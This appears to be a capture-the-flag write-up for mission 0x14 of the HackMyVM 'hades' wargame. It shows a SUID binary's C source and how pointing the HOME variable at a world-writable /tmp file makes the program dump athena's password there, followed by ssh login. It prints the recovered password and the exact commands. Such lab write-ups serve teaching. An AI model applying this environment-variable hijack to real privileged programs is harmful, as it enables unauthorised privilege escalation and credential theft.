# 0x14
This write-up explains the steps taken to complete mission 0x14 on hades@hackmyvm.eu, starting from user `atalanta` and escalating to `athena`.

## Mission
As always, we read the mission first:
```bash
atalanta@hades:~$ cat mission.txt 
################
# MISSION 0x14 #
################

## EN ##
User athena lets us run her program, but she hasn't left us her source code.
```
This mission for this stage involved analyzing a privileged binary and its source code.

## Method of Solving: Enviroment Variable Hijacking (Arbitrary File Write)
In the home directory, we found an executable named `weird` and its corresponding source file `weird.c`
```bash
atalanta@hades:~$ ls -la
total 56
drwxr-x--- 2 root     atalanta  4096 Apr  5  2024 .
drwxr-xr-x 1 root     root      4096 Apr  5  2024 ..
-rw-r--r-- 1 atalanta atalanta   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 atalanta atalanta  3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 atalanta atalanta   807 Apr 23  2023 .profile
-rw-r----- 1 root     atalanta    22 Apr  5  2024 flagz.txt
-rw-r----- 1 root     atalanta   237 Apr  5  2024 mission.txt
-r-sr-s--- 1 root     atalanta 16608 Apr  5  2024 weird
-r-------- 1 atalanta atalanta   927 Apr  5  2024 weird.c
```
Upon inspecting `weird.c`, we indentified a critical vulnerability in how the program handles the `HOME` enviroment variable.
```bash
atalanta@hades:~$ cat weird.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <pwd.h>
int main()
{
    setuid(2006); 
    setgid(2006); 
    const char *filename;
    struct stat fs;
    int r;
    filename = getenv("HOME");
    printf ("HOME detected: %s\n",filename);
    char cmd[1000];
    FILE *out_file = fopen(getenv("HOME"), "w");
    FILE *fpipe;
    char *command = "/bin/cat /var/lib/me";
    char c = 0;

    if (0 == (fpipe = (FILE*)popen(command, "r")))
    {
        perror("popen() failed.");
        exit(EXIT_FAILURE);
    }

    while (fread(&c, sizeof c, 1, fpipe))
    {
        fprintf(out_file, "%c",c);
    }
    pclose(fpipe);
    pclose(out_file);
    r = stat(filename,&fs);
    struct passwd *pw = getpwuid(fs.st_uid);
    if (pw->pw_name != "atalanta"){
    r = chmod( filename, fs.st_mode & ~(S_IROTH)+~(S_IRGRP) | S_IWGRP );
    }
    stat(filename,&fs);
    return EXIT_SUCCESS;
}
```
### 1. Code Analysis
The program performs this following actions:
- It sets its execution context to user `2006` (athena).
- It reads the contents of the restricted file `/var/lib/me` (which contains the password).
- It uses `getenv("HOME") to determine where to write the output.
- It opens the path specified in `$HOME` and writes the secret data into it.
```bash
    filename = getenv("HOME");
    printf ("HOME detected: %s\n",filename);
    char cmd[1000];
    FILE *out_file = fopen(getenv("HOME"), "w");
    FILE *fpipe;
    char *command = "/bin/cat /var/lib/me";
```

### 2. Exploiting the Path Logic
Because the program blindly trusts the user-defined `$HOME` variable as a writable file path, we could the output to a location we controlled.

### 3. Execution and Extraction
We created a temporary file with full permissions and updated my enviroment to point the bianry toward it.
```bash
atalanta@hades:~$ touch /tmp/athena_secret
atalanta@hades:~$ chmod 777 /tmp/athena_secret
atalanta@hades:~$ HOME=/tmp/athena_secret
atalanta@hades:/pwned/atalanta$ echo $HOME
/tmp/athena_secret
atalanta@hades:/pwned/atalanta$ ./weird
HOME detected: /tmp/athena_secret
atalanta@hades:/pwned/atalanta$ 
```
After running the binary, the password for `athena` was written into the `/tmp` file.
```bash
atalanta@hades:/pwned/atalanta$ cat /tmp/athena_secret
kmQMpZsXgOsnzGReRcoV
```
Using the retrieved password, we successfully established a session as `athena`.
```bash
atalanta@hades:/pwned/atalanta$ ssh athena@localhost
...
athena@hades:~$ id ; hostname
uid=2006(athena) gid=2006(athena) groups=2006(athena)
hades
```

### Explanation
- **SUID/SGID**: The `weird` binary was configured to run with elevated privileges, allowing it to read the protected `/var/lib/me` file that `atalanta` normally cannot access.
- **Arbitrary File Write**: By manipulating the enviroment variables that a program depends on, attacker can trick the software into performming operations in unintended locations.
## Key command
`touch /tmp/athena_secret`

`chmod 777 /tmp/athena_secret`

`HOME=/tmp/athena_secret`


***You are welcome!***
